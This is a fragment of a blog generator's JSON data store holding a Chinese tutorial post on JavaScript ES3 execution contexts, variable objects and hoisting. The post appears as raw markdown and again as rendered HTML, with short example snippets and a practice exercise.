true;\n}\n\nconsole.log(a);\nconsole.log(b);\t\n```\n输出结果：\n\n```\nfunction(){}\n10\n20\n1\nundefined\n```\n","source":"_posts/2016-02-20-javascript-execution-context.md","raw":"---\nlayout:     post\ntitle:      \"Javascript - ES3执行上下文\"\ndate:       2016-02-20 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/js-bg.jpg\"\ntags:\n    - Javascript\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n##  概念\n\n### 一、执行上下文: (Execution Context,缩写 EC) \n\n```javascript\nconsole.log('EC0');\nfunction funcEC1(){\n    console.log('EC1');\n    function funcEC2(){\n        console.log('EC2');\n        var funcEC3 = function(){\n            console.log('EC3');\n        };\n    }\n    funcEC2();\n}\nfuncEC1();\n```\n在Javascript引擎解析上述代码时在执行函数会依次将其添加到栈（Stack）中，即(ECO(Global),EC1,EC2)，如下图所示：\n\n![Stack: ExecutionContext](/assets/2016-02-20-javascript-execution-context/1.png)\n\n执行上下文分为：全局执行上下文和函数执行上下文。\n\n### 二、变量对象：(Variable Object VO)\n是一个抽象的概念中的‘对象’，它用于存储执行上下文中的： \n\n1. 变量\n2. 函数声明\n3. 函数参数\n\n如下述代码：  \n\n```javascript\nvar a = 10;\nfunction test(x){\n    var b = 20;\n}\ntest(30);\n```\nJavascript引擎会将其解析为：  \n\n```\nVO(globalContext) = {\n\ta: 10,\n\ttest: <ref to function>\n};\nVO(test functionContext){\n    x:30,\n            b:20\n};\n```\n\n**在浏览器中全局上下文变量对象为window，而在nodejs中全局上下文变量对象为global。**\n\n**当js代码运行前**，在全局执行上下文中(浏览器)中就会默认添加一些变量，\n如：Math,String,isNaN,window，所以在调用代码时：  \n\n```javascript\nString(10);     \t\t//[[global]].String(10)\nwindow.a = 10;  \t    //[[global]].window.a = 10\nthis.b = 20; \t\t\t//[[global]].b = 20\n```\n\n### 三、函数中的激活对象：(Active Object AO)\n\n与变量对象一样，即(VO(functionContext) === AO);  \n只不过AO多了一个变量，为arguments:\n\n```javascript\narguments = {\n\tcallee,\n\tlength,\n\tproperties-indexes\n};\t\n```\n这个可选择性忽略，没什么用。\n\n## 函数调用中的执行上下文\n代码如下：\n\n```javascript\nfunction test(a, b){\n    var c = 10;\n    function d(){}\n    var e = function _e(){};\n    (function(){})();\n    b = 20;\n}\ntest(10);\n```\n\n### 1.变量初始化阶段：  \nVO按照如下顺序填充：  (在函数执行中，AO等于VO，以下都以VO简称，不再赘述)  \n\n1. 函数参数(若未传入，初始化该参数值为undefined)\n> 这里说一下，未声明的变量和声明为undefined变量是有区别的:用alert未声明的变量会报错：ReferenceError: Can't find variable，而alert声明为undefined变量会显示undefined。\n> \n> 然而如果以属性的是形式访问的话，比如window.variable，alert未声明的属性或者声明为undefined的属性都弹出undefined.\n\n2. 函数声明 (若发生命名冲突，会覆盖之前的函数参数)\n3. 变量声明 (初始化变量值为undefined，若发生命名冲突，会忽略)  \n\n所以在执行到test(10)时，函数执行上下文变量初始化阶段为：\n\n```javascript\nVO(test) = {\n\ta:10,\n\tb:undefined,\n\tc:undefined,\n\td:<ref to func 'd'>,\n\te:undefined\n}\t\t\n```\n\n理解：首先添加函数参数，因为传入10，所以a:10而b：20，之后函数声明提升，d被添加VO，并指向func d，之后就是变量声明提升，c、e被依次添加到AO中。\n\n> 注意变量d和变量e的不同，d是函数声明而e是指向函数表达式，所以在变量初始化阶段时，d已经指向函数地址，而e被赋值必须要等到执行到e = function _e(){}代码的时候\n\n注意：函数表达式并不会影响VO；\n\n> 注意到函数_e还有下一行代码函数(function(){})(),它们都是函数表达式，所以并不会被添加到VO变量对象里。\n\n讲到这是不是觉得自己已经弄懂了，下面还有阐述一些细节的东西： \n\n* 函数声明命名冲突时覆盖函数形参:\n\n```javascript\nfunction foo(x,y,z){\n\tfunction x(){};\n\tconsole.log(x);\n}\nfoo(100);\n```\n输出结果：function (){}，因为命名冲突时函数声明命名会覆盖函数形参。\n\n* 变量声明命名冲突时不会覆盖函数形参或者函数声明：\n\n```javascript\nfunction foo(x, y, z){\n\tfunction func(){\n\t\t\t\n\t};\n\tvar func;\n\tconsole.log(func);\n}\nfunc();\n```\n输出结果：function func(){},理由如上。\n\n### 2.代码执行阶段： \n \n```javascript\nVO(test) = {\n\ta: 10,\n\tb: 20,\n\tc: 10,\n\td: <ref to func 'd'>,\n\te: function _e(){};\n};\n``` \n \n附赠一题练习题：\n\n```javascript\t\nconsole.log(x);\nvar x = 10;\n\nconsole.log(x);\nx = 20;\n\nfunction x(){}\nconsole.log(x);\n\nif(true){\n    var a = 1;\n}else{\n    var b = true;\n}\n\nconsole.log(a);\nconsole.log(b);\t\n```\n输出结果：\n\n```\nfunction(){}\n10\n20\n1\nundefined\n```\n","slug":"2016-02-20-javascript-execution-context","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rwt0006xmvdrsvt9pfv","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><h3 id=\"一、执行上下文-Execution-Context-缩写-EC\"><a href=\"#一、执行上下文-Execution-Context-缩写-EC\" class=\"headerlink\" title=\"一、执行上下文: (Execution Context,缩写 EC)\"></a>一、执行上下文: (Execution Context,缩写 EC)</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'EC0'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">funcEC1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC1'</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">funcEC2</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC2'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> funcEC3 = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC3'</span>);</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    funcEC2();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">funcEC1();</span><br></pre></td></tr></table></figure>\n<p>在Javascript引擎解析上述代码时在执行函数会依次将其添加到栈（Stack）中，即(ECO(Global),EC1,EC2)，如下图所示：</p>\n<p><img src=\"/assets/2016-02-20-javascript-execution-context/1.png\" alt=\"Stack: ExecutionContext\"></p>\n<p>执行上下文分为：全局执行上下文和函数执行上下文。</p>\n<h3 id=\"二、变量对象：-Variable-Object-VO\"><a href=\"#二、变量对象：-Variable-Object-VO\" class=\"headerlink\" title=\"二、变量对象：(Variable Object VO)\"></a>二、变量对象：(Variable Object VO)</h3><p>是一个抽象的概念中的‘对象’，它用于存储执行上下文中的： </p>\n<ol>\n<li>变量</li>\n<li>函数声明</li>\n<li>函数参数</li>\n</ol>\n<p>如下述代码：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = <span class=\"number\">20</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(<span class=\"number\">30</span>);</span><br></pre></td></tr></table></figure>\n<p>Javascript引擎会将其解析为：  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(globalContext) = &#123;</span><br><span class=\"line\">\ta: 10,</span><br><span class=\"line\">\ttest: &lt;ref to function&gt;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">VO(test functionContext)&#123;</span><br><span class=\"line\">    x:30,</span><br><span class=\"line\">            b:20</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>在浏览器中全局上下文变量对象为window，而在nodejs中全局上下文变量对象为global。</strong></p>\n<p><strong>当js代码运行前</strong>，在全局执行上下文中(浏览器)中就会默认添加一些变量，<br>如：Math,String,isNaN,window，所以在调用代码时：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">String</span>(<span class=\"number\">10</span>);     \t\t<span class=\"comment\">//[[global]].String(10)</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.a = <span class=\"number\">10</span>;  \t    <span class=\"comment\">//[[global]].window.a = 10</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.b = <span class=\"number\">20</span>; \t\t\t<span class=\"comment\">//[[global]].b = 20</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"三、函数中的激活对象：-Active-Object-AO\"><a href=\"#三、函数中的激活对象：-Active-Object-AO\" class=\"headerlink\" title=\"三、函数中的激活对象：(Active Object AO)\"></a>三、函数中的激活对象：(Active Object AO)</h3><p>与变量对象一样，即(VO(functionContext) === AO);<br>只不过AO多了一个变量，为arguments:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">arguments</span> = &#123;</span><br><span class=\"line\">\tcallee,</span><br><span class=\"line\">\tlength,</span><br><span class=\"line\">\tproperties-indexes</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这个可选择性忽略，没什么用。</p>\n<h2 id=\"函数调用中的执行上下文\"><a href=\"#函数调用中的执行上下文\" class=\"headerlink\" title=\"函数调用中的执行上下文\"></a>函数调用中的执行上下文</h2><p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">a, b</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> c = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">d</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> e = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_e</span>(<span class=\"params\"></span>)</span>&#123;&#125;;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;)();</span><br><span class=\"line\">    b = <span class=\"number\">20</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-变量初始化阶段：\"><a href=\"#1-变量初始化阶段：\" class=\"headerlink\" title=\"1.变量初始化阶段：\"></a>1.变量初始化阶段：</h3><p>VO按照如下顺序填充：  (在函数执行中，AO等于VO，以下都以VO简称，不再赘述)  </p>\n<ol>\n<li><p>函数参数(若未传入，初始化该参数值为undefined)</p>\n<blockquote>\n<p>这里说一下，未声明的变量和声明为undefined变量是有区别的:用alert未声明的变量会报错：ReferenceError: Can’t find variable，而alert声明为undefined变量会显示undefined。</p>\n<p>然而如果以属性的是形式访问的话，比如window.variable，alert未声明的属性或者声明为undefined的属性都弹出undefined.</p>\n</blockquote>\n</li>\n<li><p>函数声明 (若发生命名冲突，会覆盖之前的函数参数)</p>\n</li>\n<li>变量声明 (初始化变量值为undefined，若发生命名冲突，会忽略)  </li>\n</ol>\n<p>所以在执行到test(10)时，函数执行上下文变量初始化阶段为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(test) = &#123;</span><br><span class=\"line\">\ta:<span class=\"number\">10</span>,</span><br><span class=\"line\">\tb:<span class=\"literal\">undefined</span>,</span><br><span class=\"line\">\tc:<span class=\"literal\">undefined</span>,</span><br><span class=\"line\">\td:<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">to</span> <span class=\"attr\">func</span> '<span class=\"attr\">d</span>'&gt;</span>,</span><br><span class=\"line\">\te:undefined</span><br><span class=\"line\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>理解：首先添加函数参数，因为传入10，所以a:10而b：20，之后函数声明提升，d被添加VO，并指向func d，之后就是变量声明提升，c、e被依次添加到AO中。</p>\n<blockquote>\n<p>注意变量d和变量e的不同，d是函数声明而e是指向函数表达式，所以在变量初始化阶段时，d已经指向函数地址，而e被赋值必须要等到执行到e = function _e(){}代码的时候</p>\n</blockquote>\n<p>注意：函数表达式并不会影响VO；</p>\n<blockquote>\n<p>注意到函数_e还有下一行代码函数(function(){})(),它们都是函数表达式，所以并不会被添加到VO变量对象里。</p>\n</blockquote>\n<p>讲到这是不是觉得自己已经弄懂了，下面还有阐述一些细节的东西： </p>\n<ul>\n<li>函数声明命名冲突时覆盖函数形参:</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">x,y,z</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span>(<span class=\"params\"></span>)</span>&#123;&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(<span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n<p>输出结果：function (){}，因为命名冲突时函数声明命名会覆盖函数形参。</p>\n<ul>\n<li>变量声明命名冲突时不会覆盖函数形参或者函数声明：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">x, y, z</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> func;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(func);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">func();</span><br></pre></td></tr></table></figure>\n<p>输出结果：function func(){},理由如上。</p>\n<h3 id=\"2-代码执行阶段：\"><a href=\"#2-代码执行阶段：\" class=\"headerlink\" title=\"2.代码执行阶段：\"></a>2.代码执行阶段：</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(test) = &#123;</span><br><span class=\"line\">\ta: <span class=\"number\">10</span>,</span><br><span class=\"line\">\tb: <span class=\"number\">20</span>,</span><br><span class=\"line\">\tc: <span class=\"number\">10</span>,</span><br><span class=\"line\">\td: <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">to</span> <span class=\"attr\">func</span> '<span class=\"attr\">d</span>'&gt;</span>,</span><br><span class=\"line\">\te: function _e()&#123;&#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">``` </span><br><span class=\"line\"> </span><br><span class=\"line\">附赠一题练习题：</span><br><span class=\"line\"></span><br><span class=\"line\">```javascript\t</span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\">var x = 10;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\">x = 20;</span><br><span class=\"line\"></span><br><span class=\"line\">function x()&#123;&#125;</span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\"></span><br><span class=\"line\">if(true)&#123;</span><br><span class=\"line\">    var a = 1;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    var b = true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(a);</span><br><span class=\"line\">console.log(b);</span></span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function()&#123;&#125;</span><br><span class=\"line\">10</span><br><span class=\"line\">20</span><br><span class=\"line\">1</span><br><span class=\"line\">undefined</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><h3 id=\"一、执行上下文-Execution-Context-缩写-EC\"><a href=\"#一、执行上下文-Execution-Context-缩写-EC\" class=\"headerlink\" title=\"一、执行上下文: (Execution Context,缩写 EC)\"></a>一、执行上下文: (Execution Context,缩写 EC)</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'EC0'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">funcEC1</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC1'</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">funcEC2</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC2'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> funcEC3 = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"string\">'EC3'</span>);</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    funcEC2();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">funcEC1();</span><br></pre></td></tr></table></figure>\n<p>在Javascript引擎解析上述代码时在执行函数会依次将其添加到栈（Stack）中，即(ECO(Global),EC1,EC2)，如下图所示：</p>\n<p><img src=\"/assets/2016-02-20-javascript-execution-context/1.png\" alt=\"Stack: ExecutionContext\"></p>\n<p>执行上下文分为：全局执行上下文和函数执行上下文。</p>\n<h3 id=\"二、变量对象：-Variable-Object-VO\"><a href=\"#二、变量对象：-Variable-Object-VO\" class=\"headerlink\" title=\"二、变量对象：(Variable Object VO)\"></a>二、变量对象：(Variable Object VO)</h3><p>是一个抽象的概念中的‘对象’，它用于存储执行上下文中的： </p>\n<ol>\n<li>变量</li>\n<li>函数声明</li>\n<li>函数参数</li>\n</ol>\n<p>如下述代码：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">x</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = <span class=\"number\">20</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(<span class=\"number\">30</span>);</span><br></pre></td></tr></table></figure>\n<p>Javascript引擎会将其解析为：  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(globalContext) = &#123;</span><br><span class=\"line\">\ta: 10,</span><br><span class=\"line\">\ttest: &lt;ref to function&gt;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">VO(test functionContext)&#123;</span><br><span class=\"line\">    x:30,</span><br><span class=\"line\">            b:20</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>在浏览器中全局上下文变量对象为window，而在nodejs中全局上下文变量对象为global。</strong></p>\n<p><strong>当js代码运行前</strong>，在全局执行上下文中(浏览器)中就会默认添加一些变量，<br>如：Math,String,isNaN,window，所以在调用代码时：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">String</span>(<span class=\"number\">10</span>);     \t\t<span class=\"comment\">//[[global]].String(10)</span></span><br><span class=\"line\"><span class=\"built_in\">window</span>.a = <span class=\"number\">10</span>;  \t    <span class=\"comment\">//[[global]].window.a = 10</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.b = <span class=\"number\">20</span>; \t\t\t<span class=\"comment\">//[[global]].b = 20</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"三、函数中的激活对象：-Active-Object-AO\"><a href=\"#三、函数中的激活对象：-Active-Object-AO\" class=\"headerlink\" title=\"三、函数中的激活对象：(Active Object AO)\"></a>三、函数中的激活对象：(Active Object AO)</h3><p>与变量对象一样，即(VO(functionContext) === AO);<br>只不过AO多了一个变量，为arguments:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">arguments</span> = &#123;</span><br><span class=\"line\">\tcallee,</span><br><span class=\"line\">\tlength,</span><br><span class=\"line\">\tproperties-indexes</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这个可选择性忽略，没什么用。</p>\n<h2 id=\"函数调用中的执行上下文\"><a href=\"#函数调用中的执行上下文\" class=\"headerlink\" title=\"函数调用中的执行上下文\"></a>函数调用中的执行上下文</h2><p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">a, b</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> c = <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">d</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> e = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_e</span>(<span class=\"params\"></span>)</span>&#123;&#125;;</span><br><span class=\"line\">    (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;)();</span><br><span class=\"line\">    b = <span class=\"number\">20</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-变量初始化阶段：\"><a href=\"#1-变量初始化阶段：\" class=\"headerlink\" title=\"1.变量初始化阶段：\"></a>1.变量初始化阶段：</h3><p>VO按照如下顺序填充：  (在函数执行中，AO等于VO，以下都以VO简称，不再赘述)  </p>\n<ol>\n<li><p>函数参数(若未传入，初始化该参数值为undefined)</p>\n<blockquote>\n<p>这里说一下，未声明的变量和声明为undefined变量是有区别的:用alert未声明的变量会报错：ReferenceError: Can’t find variable，而alert声明为undefined变量会显示undefined。</p>\n<p>然而如果以属性的是形式访问的话，比如window.variable，alert未声明的属性或者声明为undefined的属性都弹出undefined.</p>\n</blockquote>\n</li>\n<li><p>函数声明 (若发生命名冲突，会覆盖之前的函数参数)</p>\n</li>\n<li>变量声明 (初始化变量值为undefined，若发生命名冲突，会忽略)  </li>\n</ol>\n<p>所以在执行到test(10)时，函数执行上下文变量初始化阶段为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(test) = &#123;</span><br><span class=\"line\">\ta:<span class=\"number\">10</span>,</span><br><span class=\"line\">\tb:<span class=\"literal\">undefined</span>,</span><br><span class=\"line\">\tc:<span class=\"literal\">undefined</span>,</span><br><span class=\"line\">\td:<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">to</span> <span class=\"attr\">func</span> '<span class=\"attr\">d</span>'&gt;</span>,</span><br><span class=\"line\">\te:undefined</span><br><span class=\"line\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>理解：首先添加函数参数，因为传入10，所以a:10而b：20，之后函数声明提升，d被添加VO，并指向func d，之后就是变量声明提升，c、e被依次添加到AO中。</p>\n<blockquote>\n<p>注意变量d和变量e的不同，d是函数声明而e是指向函数表达式，所以在变量初始化阶段时，d已经指向函数地址，而e被赋值必须要等到执行到e = function _e(){}代码的时候</p>\n</blockquote>\n<p>注意：函数表达式并不会影响VO；</p>\n<blockquote>\n<p>注意到函数_e还有下一行代码函数(function(){})(),它们都是函数表达式，所以并不会被添加到VO变量对象里。</p>\n</blockquote>\n<p>讲到这是不是觉得自己已经弄懂了，下面还有阐述一些细节的东西： </p>\n<ul>\n<li>函数声明命名冲突时覆盖函数形参:</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 